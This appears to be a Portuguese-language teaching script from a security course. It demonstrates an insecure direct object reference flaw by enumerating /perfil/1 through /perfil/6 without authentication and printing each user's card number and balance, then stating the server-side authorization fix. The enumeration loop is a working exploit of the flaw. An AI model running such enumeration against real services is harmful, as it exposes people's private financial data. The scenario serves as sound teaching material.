"""
CENÁRIO 05 · IDOR — Insecure Direct Object Reference
Autorização (Semana 08) · CIA: Confidencialidade.

O endpoint /perfil/<id> devolve dados privados sem checar se quem pede é o dono.
Trocando o número na URL (enumeração), o atacante lê o cartão e o saldo de todos.
É a diferença entre AUTENTICAÇÃO (quem é você) e AUTORIZAÇÃO (o que você pode ver).
"""
from config import checar_escopo, titulo, sessao

ALVO = checar_escopo()


def main():
    titulo("05", "IDOR / quebra de controle de acesso", "Semana 08 - Autorização")

    print("\nEnumerando /perfil/1 .. /perfil/6 (sem autenticação nenhuma):\n")
    vazados = 0
    for uid in range(1, 7):
        r = sessao.get(f"{ALVO}/perfil/{uid}")
        if r.status_code == 200:
            d = r.json()
            print(f"  id={uid}: {d['usuario']:6} papel={d['papel']:7} "
                  f"cartão={d['cartao']:20} saldo=R$ {d['saldo']}")
            vazados += 1
        else:
            print(f"  id={uid}: {r.status_code}")
    print(f"\nTotal de perfis expostos: {vazados}.")
    print("CORREÇÃO: exigir token válido e autorizar no servidor — conferir que")
    print("          token['usuario'] é o dono do recurso (ou tem papel permitido).")


if __name__ == "__main__":
    main()
